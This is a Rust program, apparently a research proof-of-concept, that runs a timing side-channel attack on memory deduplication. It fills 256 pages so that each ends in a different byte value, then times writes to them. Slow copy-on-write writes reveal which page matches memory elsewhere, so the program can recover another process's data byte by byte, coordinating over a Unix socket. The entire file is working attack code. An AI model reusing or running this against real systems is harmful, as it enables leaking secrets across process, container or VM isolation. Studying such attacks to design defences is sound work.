use std::{
    io::Write,
    sync::atomic::compiler_fence,
    time::{Duration, Instant},
};

use test_program::{alloc_pages, fill_page, Page, PAGESIZE};

pub fn main() {
    let mut pages = alloc_pages(256);
    pages.iter_mut().for_each(fill_page);
    pages[0][0] = 3;
    let (deviation, expected) = compute_deviation_expected(&mut pages[0], 100000);
    println!(
        "Computed expected value of {}ns with deviation of {}",
        expected, deviation
    );
    pages[0][0] = 5;
    pages[0][1] = 5;
    let wait_time = measure_needed_time(&mut pages[0], deviation, expected);
    println!("Waiting {} seconds between reads", wait_time.as_secs());
    fill_page(&mut pages[0]);
    fill_page(&mut pages[1]);
    let mut socket = std::os::unix::net::UnixStream::connect(std::path::Path::new(
        &std::env::args_os().nth(1).expect("Expected 1 argument"),
    ))
    .expect("Unable to open unix socket");
    socket
        .write_all(&[0u8])
        .expect("Unable to write message to socket");
    loop {
        let res = guess_byte(&mut pages, deviation, expected, wait_time);
            println!("found {}", res);
        socket
            .write_all(&[0u8])
            .expect("Unable to write message to socket");
    }
}

fn measure_needed_time(page: &mut Page, deviation: u64, expected: u64) -> Duration {
    let mut count = 0u64;
    let threshold = expected + 3 * deviation;
    loop {
        if (threshold as u128) < time_write(page).as_nanos() {
            break Duration::from_secs(count);
        }
        std::thread::sleep(Duration::from_secs(1));
        count += 1;
    }
}

fn compute_deviation_expected(page: &mut Page, samples: u128) -> (u64, u64) {
    let mut sum = 0u128;
    let mut sum_squared = 0u128;
    for _ in 0..samples {
        let duration = time_write(page).as_nanos();
        sum += duration;
        sum_squared += duration * duration;
    }
    sum /= samples;
    sum_squared /= samples;
    (
        (f64::from(u32::try_from(sum_squared - sum * sum).unwrap()).sqrt() as u32) as u64,
        sum as u64,
    )
}

fn time_write(page: &mut Page) -> Duration {
    let index = page.len() - 1;
    //also loads value into l1 cache
    let value = page[index];
    compiler_fence(std::sync::atomic::Ordering::SeqCst);
    let pre = Instant::now();
    compiler_fence(std::sync::atomic::Ordering::SeqCst);
    page[index] = value;
    compiler_fence(std::sync::atomic::Ordering::SeqCst);
    let post = Instant::now();
    post - pre
}

fn guess_byte(pages: &mut [Page], deviation: u64, expected: u64, wait: Duration) -> u8 {
    if pages.len() < 256 {
        panic!("not enough pages");
    }
    let mut page_hit_counter = [0i32; 256];
    let mut page_num = 256;
    let threshold = expected + 9 * deviation;
    for i in 0u8..=255u8 {
        pages[i as usize].copy_within(1..(*PAGESIZE), 0);
        pages[i as usize][(*PAGESIZE) - 1] = i;
    }
    println!("Guessing next byte");
    while page_num > 1 {
        println!("{} guesses remaining", page_num);
        for _ in 0..8 {
            std::thread::sleep(wait);
            for i in 0usize..=255usize {
                if page_hit_counter[i] != -1 {
                    let nanos = time_write(&mut pages[i]).as_nanos();
                    if nanos > (threshold as u128) {
                        page_hit_counter[i] += 1;
                        println!(
                            "hit on page {} with {}ns, higher than {}",
                            i, nanos, threshold
                        );
                    }
                }
            }
        }
        for counter in &mut page_hit_counter {
            if *counter != -1 {
                if *counter < 2 {
                    page_num -= 1;
                    *counter = -1;
                } else {
                    *counter = 0;
                }
            }
        }
        if page_num == 0 {
            panic!("No significant page found")
        }
    }

    let mut correct = 0;
    for i in 0u8..=255u8 {
        if page_hit_counter[i as usize] != -1 {
            correct = i;
            break;
        }
    }
    for page in pages {
        page[(*PAGESIZE) - 1] = correct;
    }
    correct
}
